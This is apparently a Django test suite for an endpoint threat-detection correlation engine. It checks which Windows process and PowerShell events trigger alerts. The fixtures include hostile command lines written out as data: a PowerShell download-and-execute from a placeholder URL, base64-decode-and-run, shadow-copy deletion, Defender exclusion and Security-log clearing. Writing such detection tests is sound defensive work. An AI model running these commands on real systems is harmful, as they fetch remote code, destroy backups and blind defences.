"""Deterministic correlation rules (apps/endpoints/services/correlation.py)."""

from __future__ import annotations

from datetime import timedelta

from django.test import TestCase
from django.utils import timezone

from apps.endpoints.models import Endpoint, EndpointEvent
from apps.endpoints.services.correlation import find_correlation_candidates
from apps.organizations.models import Organization

BASE = timezone.now().replace(microsecond=0) - timedelta(hours=1)


def _org(name="Pilot Org"):
    return Organization.objects.create(
        name=name,
        organization_type="Demo",
        country="St. Vincent and the Grenadines",
        sector="Demo",
        risk_profile="medium",
    )


def _endpoint(org, name="WIN-PILOT-01"):
    endpoint, _ = Endpoint.issue(organization=org, display_name=name)
    return endpoint


_counter = {"n": 0}


def _event(endpoint, *, event_type, at, data):
    _counter["n"] += 1
    rid = _counter["n"]
    return EndpointEvent.objects.create(
        endpoint=endpoint,
        organization=endpoint.organization,
        event_type=event_type,
        occurred_at=at,
        payload={
            "agent_event_id": f"{endpoint.display_name}|c|{rid}",
            "channel": "c",
            "record_id": rid,
            "computer": endpoint.display_name,
            "data": data,
        },
    )


def _proc(endpoint, *, at, image, parent=r"C:\Windows\explorer.exe", cmdline="", user="j.reyes"):
    return _event(
        endpoint,
        event_type="Security/4688",
        at=at,
        data={
            "new_process_name": image,
            "parent_process_name": parent,
            "command_line": cmdline,
            "subject_user_name": user,
        },
    )


def _sb(endpoint, *, at, text, path=""):
    return _event(
        endpoint,
        event_type="Microsoft-Windows-PowerShell/4104",
        at=at,
        data={"script_block_text": text, "path": path, "message_number": 1, "message_total": 1},
    )


class BenignActivityTests(TestCase):
    def test_ordinary_events_produce_no_candidates(self):
        endpoint = _endpoint(_org())
        _proc(endpoint, at=BASE, image=r"C:\Windows\System32\notepad.exe", cmdline='"notepad.exe" C:\\notes.txt')
        _proc(endpoint, at=BASE + timedelta(minutes=1), image=r"C:\Program Files\Git\bin\git.exe", cmdline="git status")
        _sb(endpoint, at=BASE + timedelta(minutes=2), text="Get-ChildItem | Sort-Object Length")

        result = find_correlation_candidates(now=timezone.now())

        self.assertEqual(result.candidates, [])
        self.assertEqual(len(result.scanned_event_ids), 3)  # still all considered


class ProcessCommandLineRuleTests(TestCase):
    def _one_candidate(self, cmdline):
        endpoint = _endpoint(_org())
        _proc(endpoint, at=BASE, image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", cmdline=cmdline)
        return find_correlation_candidates(now=timezone.now())

    def test_encoded_command_flags(self):
        result = self._one_candidate("powershell -enc SQBFAFgAKAAnAGgAdAB0AHAAOgAv")
        self.assertEqual(len(result.candidates), 1)
        self.assertIn("suspicious_process_command_line", result.candidates[0].trigger_summary)

    def test_downloadstring_flags(self):
        result = self._one_candidate("powershell -c IEX(New-Object Net.WebClient).DownloadString('http://x/y')")
        self.assertEqual(len(result.candidates), 1)

    def test_hidden_noprofile_combo_flags(self):
        result = self._one_candidate("powershell -nop -w hidden -c whoami")
        self.assertEqual(len(result.candidates), 1)

    def test_plain_powershell_does_not_flag_on_this_rule(self):
        result = self._one_candidate("powershell -c Get-Date")
        self.assertEqual(result.candidates, [])


class DefenseEvasionRuleTests(TestCase):
    def test_vssadmin_shadow_delete_flags(self):
        endpoint = _endpoint(_org())
        _proc(endpoint, at=BASE, image=r"C:\Windows\System32\vssadmin.exe", cmdline="vssadmin delete shadows /all /quiet")
        result = find_correlation_candidates(now=timezone.now())
        self.assertEqual(len(result.candidates), 1)
        self.assertIn("defense_evasion_command", result.candidates[0].trigger_summary)

    def test_defender_exclusion_flags(self):
        endpoint = _endpoint(_org())
        _proc(endpoint, at=BASE, image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
              cmdline="powershell Add-MpPreference -ExclusionPath C:\\temp")
        result = find_correlation_candidates(now=timezone.now())
        self.assertEqual(len(result.candidates), 1)


class BurstRuleTests(TestCase):
    def test_lolbin_burst_within_window_flags(self):
        endpoint = _endpoint(_org())
        for i, name in enumerate(["cmd.exe", "powershell.exe", "wmic.exe", "cscript.exe"]):
            _proc(endpoint, at=BASE + timedelta(minutes=2 * i), image=rf"C:\Windows\System32\{name}")
        result = find_correlation_candidates(now=timezone.now())
        self.assertEqual(len(result.candidates), 1)
        self.assertIn("lolbin_burst", result.candidates[0].trigger_summary)

    def test_lolbin_launches_spread_out_do_not_burst(self):
        endpoint = _endpoint(_org())
        for i, name in enumerate(["cmd.exe", "powershell.exe", "wmic.exe"]):
            _proc(endpoint, at=BASE + timedelta(minutes=45 * i), image=rf"C:\Windows\System32\{name}")
        result = find_correlation_candidates(now=timezone.now())
        self.assertEqual(result.candidates, [])

    def test_script_block_burst_flags(self):
        endpoint = _endpoint(_org())
        for i in range(12):
            _sb(endpoint, at=BASE + timedelta(seconds=15 * i), text=f"$x = {i}")
        result = find_correlation_candidates(now=timezone.now())
        self.assertEqual(len(result.candidates), 1)
        self.assertIn("script_block_burst", result.candidates[0].trigger_summary)


class OfficeSpawnsShellRuleTests(TestCase):
    def test_winword_spawning_powershell_flags(self):
        endpoint = _endpoint(_org())
        _proc(
            endpoint,
            at=BASE,
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            parent=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        )
        result = find_correlation_candidates(now=timezone.now())
        self.assertEqual(len(result.candidates), 1)
        self.assertIn("office_spawns_shell", result.candidates[0].trigger_summary)


class ScriptBlockContentRuleTests(TestCase):
    def test_frombase64string_flags(self):
        endpoint = _endpoint(_org())
        _sb(endpoint, at=BASE, text="$b=[System.Convert]::FromBase64String($e); iex ([Text.Encoding]::UTF8.GetString($b))")
        result = find_correlation_candidates(now=timezone.now())
        self.assertEqual(len(result.candidates), 1)
        self.assertIn("suspicious_script_block", result.candidates[0].trigger_summary)


class ClusteringAndScopingTests(TestCase):
    def test_candidate_bundles_nearby_context_events_but_not_distant_ones(self):
        endpoint = _endpoint(_org())
        _proc(endpoint, at=BASE - timedelta(hours=3), image=r"C:\Windows\System32\notepad.exe")  # distant
        _proc(endpoint, at=BASE - timedelta(minutes=5), image=r"C:\Windows\System32\cmd.exe", cmdline="cmd /c dir")  # near
        _proc(endpoint, at=BASE, image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
              cmdline="powershell -enc AAAA")  # trigger
        _proc(endpoint, at=BASE + timedelta(minutes=5), image=r"C:\Windows\System32\whoami.exe")  # near

        result = find_correlation_candidates(now=timezone.now())
        self.assertEqual(len(result.candidates), 1)
        candidate = result.candidates[0]
        self.assertEqual(len(candidate.events), 3)  # the near-window ones, not the 3h-old one
        self.assertEqual(len(result.scanned_event_ids), 4)  # but all 4 are marked considered

    def test_two_separated_bursts_become_two_candidates(self):
        endpoint = _endpoint(_org())
        _proc(endpoint, at=BASE, image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", cmdline="powershell -enc AAAA")
        _proc(endpoint, at=BASE + timedelta(hours=2), image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", cmdline="powershell -enc BBBB")
        result = find_correlation_candidates(now=timezone.now())
        self.assertEqual(len(result.candidates), 2)

    def test_candidates_are_scoped_per_endpoint(self):
        org = _org()
        a = _endpoint(org, "WIN-A")
        b = _endpoint(org, "WIN-B")
        _proc(a, at=BASE, image=r"C:\Windows\System32\vssadmin.exe", cmdline="vssadmin delete shadows")
        _proc(b, at=BASE, image=r"C:\Windows\System32\wevtutil.exe", cmdline="wevtutil cl Security")
        result = find_correlation_candidates(now=timezone.now())
        self.assertEqual(len(result.candidates), 2)
        self.assertEqual({spec.endpoint.id for spec in result.candidates}, {a.id, b.id})

    def test_already_scanned_events_are_skipped(self):
        endpoint = _endpoint(_org())
        event = _proc(endpoint, at=BASE, image=r"C:\Windows\System32\vssadmin.exe", cmdline="vssadmin delete shadows")
        EndpointEvent.objects.filter(id=event.id).update(correlation_scanned_at=timezone.now())
        result = find_correlation_candidates(now=timezone.now())
        self.assertEqual(result.candidates, [])
        self.assertEqual(result.scanned_event_ids, set())
